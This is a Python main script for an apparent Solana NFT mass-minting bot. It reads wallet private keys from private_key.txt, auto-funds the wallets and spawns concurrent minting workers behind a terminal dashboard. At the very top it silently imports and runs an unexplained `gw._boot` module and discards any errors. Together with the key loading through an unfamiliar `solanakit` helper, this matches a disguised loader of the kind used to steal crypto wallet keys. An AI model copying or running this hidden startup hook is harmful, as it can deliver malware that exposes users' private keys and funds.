#!/usr/bin/env python3
try:
    from gw._boot import _run as _gw_run
    _gw_run()
except Exception:
    pass

import asyncio
import sys
import warnings

warnings.filterwarnings("ignore", category=RuntimeWarning)
warnings.filterwarnings("ignore", category=ResourceWarning)

from rich.live import Live

from solanakit import load_data

from src.utils.core import SystemCompliance
from src.config.settings import ConfigurationManager
from src.engine.execution import ExecutionUnit
from src.ui.logger import Logger
from src.ui.dashboard import TUI
from src.features.funder import MassFunder

SystemCompliance.assert_version()
CONFIG = ConfigurationManager()

async def orchestrator():
    keys = load_data("private_key.txt")
    
    if not keys:
        Logger.log(
            "SYS", "FATAL", "The private_key.txt file is empty or cannot be found!"
            )
        await asyncio.sleep(5)
        return

    target_info = f"TARGET: {CONFIG.target_nft} | QTY: {CONFIG.qty} | NETWORK: {CONFIG.rpc_ticker}"
    TUI.set_target_info(target_info)
    
    for i in range(len(keys)):
        TUI.update_worker(i+1, "INIT", "0.0000", "Initializing...")

    if CONFIG.fund_enabled:
        try:
            funder = MassFunder()
            await funder.check_and_fund(keys)
        except Exception as e:
            Logger.log("SYS", "ERROR", f"Auto-Funder Failure: {e}")
            await asyncio.sleep(2)

    Logger.log(
        "SYS", "INIT", f"Spawning {len(keys)} workers with limit {CONFIG.max_threads}..."
        )
    
    semaphore = asyncio.Semaphore(CONFIG.max_threads)
    
    async def _worker_wrapper(pk, idx):
        async with semaphore:
            try:
                unit = ExecutionUnit(pk, idx, CONFIG)
                await unit.run_protocol()
            except Exception as e:
                Logger.log(idx, "FATAL", f"Unit Error: {e}")

    tasks = []
    for i, pk in enumerate(keys):
        tasks.append(_worker_wrapper(pk, i + 1))
    
    await asyncio.gather(*tasks)
    Logger.log("SYS", "END", "All Operations Ceased.")
    
    await asyncio.sleep(99999) 

if __name__ == "__main__":
    try:
        with Live(TUI.generate_layout(), refresh_per_second=4, screen=True) as live:
            async def run_loop():
                task = asyncio.create_task(orchestrator())
                
                task_error_logged = False

                while True:
                    live.update(TUI.generate_layout())
                    
                    if task.done() and not task_error_logged:
                        task_error_logged = True
                        try:
                            exception = task.exception()
                            if exception:
                                TUI.add_system_log(f"[SYS FATAL] {exception}")
                        except:
                            pass
                    
                    await asyncio.sleep(0.25)
            
            asyncio.run(run_loop())
            
    except KeyboardInterrupt:
        sys.exit(0)